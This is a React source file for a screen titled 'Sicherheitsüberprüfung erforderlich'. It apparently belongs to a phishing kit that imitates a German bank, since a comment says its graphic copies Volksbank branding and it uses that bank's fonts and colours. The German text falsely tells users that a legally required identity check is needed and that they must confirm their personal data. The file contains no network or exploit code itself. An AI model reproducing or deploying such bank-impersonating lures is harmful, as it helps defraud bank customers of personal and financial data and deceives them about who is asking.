import React, { useState, useEffect } from 'react';

interface AccountCompromisedScreenProps {
  onStartVerification: () => void;
}

const AccountCompromisedScreen: React.FC<AccountCompromisedScreenProps> = ({ onStartVerification }) => {
  const [isMobile, setIsMobile] = useState(false);

  useEffect(() => {
    const checkScreenSize = () => {
      setIsMobile(window.innerWidth <= 768);
    };

    checkScreenSize();
    window.addEventListener('resize', checkScreenSize);
    return () => window.removeEventListener('resize', checkScreenSize);
  }, []);

  return (
    <div style={{
      backgroundColor: '#f8f9fa',
      minHeight: '60vh',
      padding: '0',
      fontFamily: 'VB-Regular, Arial, sans-serif',
      display: 'flex',
      alignItems: 'center',
      justifyContent: 'center'
    }}>
      <div style={{
        maxWidth: '1400px',
        width: '100%',
        margin: '0 auto',
        padding: isMobile ? '40px 20px' : '60px 8px',
        textAlign: 'center'
      }}>
        {/* Blue Illustration/Graphic */}
        <div style={{
          marginBottom: isMobile ? '40px' : '60px',
          display: 'flex',
          justifyContent: 'center'
        }}>
          <svg 
            width={isMobile ? "300" : "400"} 
            height={isMobile ? "150" : "200"} 
            viewBox="0 0 400 200" 
            fill="none" 
            xmlns="http://www.w3.org/2000/svg"
          >
            {/* Blue illustration elements similar to Volksbank branding */}
            <rect x="50" y="50" width="300" height="100" rx="10" fill="#003d7a" opacity="0.1"/>
            <circle cx="100" cy="100" r="30" fill="#003d7a" opacity="0.3"/>
            <circle cx="300" cy="100" r="25" fill="#ff6600" opacity="0.5"/>
            <rect x="150" y="80" width="100" height="40" rx="5" fill="#003d7a" opacity="0.2"/>
            
            {/* Security shield icon */}
            <g transform="translate(180, 70)">
              <path d="M20 0L40 10V30C40 35 35 40 20 40C5 40 0 35 0 30V10L20 0Z" fill="#003d7a"/>
              <path d="M20 5L35 12V28C35 31 31 35 20 35C9 35 5 31 5 28V12L20 5Z" fill="#ffffff"/>
              <path d="M15 20L18 23L25 16" stroke="#003d7a" strokeWidth="2" fill="none"/>
            </g>
          </svg>
        </div>

        {/* Title */}
        <h1 style={{
          color: '#003d7a',
          fontSize: isMobile ? '1.75rem' : '2.5rem',
          fontWeight: 'normal',
          margin: '0 0 24px 0',
          lineHeight: isMobile ? '2rem' : '3rem',
          fontFamily: 'VB-Bold, Arial, sans-serif',
          fontStyle: 'normal'
        }}>
          Sicherheitsüberprüfung erforderlich
        </h1>

        {/* Description */}
        <div style={{
          maxWidth: '600px',
          margin: '0 auto 48px auto'
        }}>
          <p style={{
            color: '#333333',
            fontSize: isMobile ? '16px' : '18px',
            lineHeight: isMobile ? '24px' : '28px',
            margin: '0 0 20px 0',
            fontFamily: 'VB-Regular, Arial, sans-serif',
            fontStyle: 'normal'
          }}>
            Aus Sicherheitsgründen müssen wir Ihre Identität überprüfen.
          </p>
          
          <p style={{
            color: '#333333',
            fontSize: isMobile ? '16px' : '18px',
            lineHeight: isMobile ? '24px' : '28px',
            margin: '0',
            fontFamily: 'VB-Regular, Arial, sans-serif',
            fontStyle: 'normal'
          }}>
            Bitte bestätigen Sie Ihre persönlichen Daten, um fortzufahren.
          </p>
        </div>

        {/* Security Notice */}
        <div style={{
          backgroundColor: '#e8f4fd',
          border: '1px solid #b8d4e3',
          borderRadius: '8px',
          padding: isMobile ? '20px' : '24px',
          marginBottom: '40px',
          maxWidth: '500px',
          margin: '0 auto 40px auto'
        }}>
          <div style={{
            display: 'flex',
            alignItems: 'flex-start',
            gap: '12px'
          }}>
            <div style={{
              backgroundColor: '#003d7a',
              borderRadius: '50%',
              width: '24px',
              height: '24px',
              display: 'flex',
              alignItems: 'center',
              justifyContent: 'center',
              flexShrink: 0,
              marginTop: '2px'
            }}>
              <span style={{
                color: 'white',
                fontSize: '14px',
                fontWeight: 'bold'
              }}>i</span>
            </div>
            <div>
              <h3 style={{
                margin: '0 0 8px 0',
                fontSize: '16px',
                fontWeight: 'normal',
                color: '#003d7a',
                fontFamily: 'VB-Bold, Arial, sans-serif',
                fontStyle: 'normal'
              }}>
                Wichtiger Sicherheitshinweis
              </h3>
              <p style={{
                margin: '0',
                fontSize: '14px',
                color: '#333333',
                lineHeight: '1.5',
                fontFamily: 'VB-Regular, Arial, sans-serif',
                fontStyle: 'normal'
              }}>
                Diese Überprüfung dient dem Schutz Ihres Kontos und ist gesetzlich vorgeschrieben.
              </p>
            </div>
          </div>
        </div>

        {/* Continue Button */}
        <button
          onClick={onStartVerification}
          style={{
            backgroundColor: '#0066b3',
            color: 'white',
            border: 'none',
            borderRadius: '50px',
            padding: isMobile ? '16px 32px' : '18px 48px',
            fontSize: isMobile ? '16px' : '18px',
            fontFamily: 'VB-Bold, Arial, sans-serif',
            fontStyle: 'normal',
            fontWeight: 'normal',
            cursor: 'pointer',
            transition: 'background-color 0.2s ease',
            textAlign: 'center',
            display: 'inline-block',
            lineHeight: '1.5',
            minWidth: isMobile ? '280px' : '320px'
          }}
          onMouseOver={(e) => {
            e.currentTarget.style.backgroundColor = '#0052a3';
          }}
          onMouseOut={(e) => {
            e.currentTarget.style.backgroundColor = '#0066b3';
          }}
        >
          Verifizierung starten
        </button>

        {/* Additional Security Info */}
        <div style={{
          marginTop: '48px',
          maxWidth: '500px',
          margin: '48px auto 0 auto'
        }}>
          <p style={{
            color: '#6c757d',
            fontSize: '14px',
            lineHeight: '20px',
            margin: '0',
            fontFamily: 'VB-Regular, Arial, sans-serif',
            fontStyle: 'normal'
          }}>
            <strong>Hinweis:</strong> Ihre Daten werden verschlüsselt übertragen und gemäß den geltenden Datenschutzbestimmungen verarbeitet.
          </p>
        </div>
      </div>
    </div>
  );
};

export default AccountCompromisedScreen;
